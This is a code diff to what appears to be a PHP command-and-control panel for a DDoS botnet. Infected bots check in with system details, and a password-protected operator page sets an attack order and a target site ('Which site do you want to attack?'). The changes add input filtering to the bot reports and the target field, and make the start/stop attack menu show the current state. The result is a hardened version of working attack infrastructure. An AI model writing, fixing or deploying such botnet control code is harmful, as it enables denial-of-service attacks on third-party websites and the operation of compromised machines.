@@ -44,12 +44,19 @@ $curPw = $curPw[0];
 if($_GET['p'] == "bot") {
 	print $order."\n".$target;
 
+	// filter html stuff
+	$botOs = strip_tags($_GET['os']);
+	$botSystemname = strip_tags($_GET['username']);
+	$botVersion = strip_tags($_GET['version']);
+	$botOsDetail = strip_tags($_GET['osdetail']);
+	$botArchitecture = strip_tags($_GET['architecture']);
+
 	// save bot parameter
-	$clientIpAddress = $_SERVER["REMOTE_ADDR"];
+	$clientIpAddress = strip_tags($_SERVER["REMOTE_ADDR"]);
 
 	// save bot if he not exists and override timestamp if he already exists
 	$saveBot = fopen("data/bots/".$clientIpAddress, "w+");
-	$writeBotsContent = $timestamp.";".$_GET['os'].";".$_GET['username'].";".$_GET['version'].";".$_GET['osdetail'].";".$_GET['architecture'];
+	$writeBotsContent = $timestamp.";".$botOs.";".$botSystemname.";".$botVersion.";".$botOsDetail.";".$botArchitecture;
 	fwrite($saveBot, $writeBotsContent);
 	fclose($saveBot);
 	// delete all timed out bots
@@ -79,11 +86,13 @@ elseif(hash("sha512", $_GET['p']) == $curPw) {
 
 	// save new config
 	if($_GET['order'] != "" && $_GET['target'] != "") {
-		$writeConf = fopen($configFile, "w");
-		fwrite($writeConf, $_GET['order']."\n".$_GET['target']);
-		fclose($writeConf);
+		// filter target parameter
 		$order = $_GET['order'];
-		$target = $_GET['target'];
+                $target = strip_tags($_GET['target']);
+
+		$writeConf = fopen($configFile, "w");
+		fwrite($writeConf, $order."\n".$target);
+		fclose($writeConf);
 	}
 
 	// save new password
@@ -190,8 +199,14 @@ elseif(hash("sha512", $_GET['p']) == $curPw) {
 	print "<form method=\"get\">";
 	print "<table border=\"0\"><tr><td>";
 	print "<select name=\"order\" id=\"attackorder\">";
-	print "<option value=\"yes\">start attack</option>";
-	print "<option value=\"no\">stop attack</option>";
+	if($order == "no") {
+		print "<option value=\"yes\">start attack</option>";
+		print "<option value=\"no\">stop attack</option>";
+	}
+	else {
+		print "<option value=\"no\">stop attack</option>";
+                print "<option value=\"yes\">start attack</option>";
+	}
 	print "</select></td>";
         print "<td><input id=\"input\" title=\"Which site do you want to attack?\" type=\"text\" name=\"target\" value=\"".$target."\"></td>";
 	if ($_GET['np'] == "" || $_GET['npc'] == "" || $_GET['np'] != $_GET['npc']) {
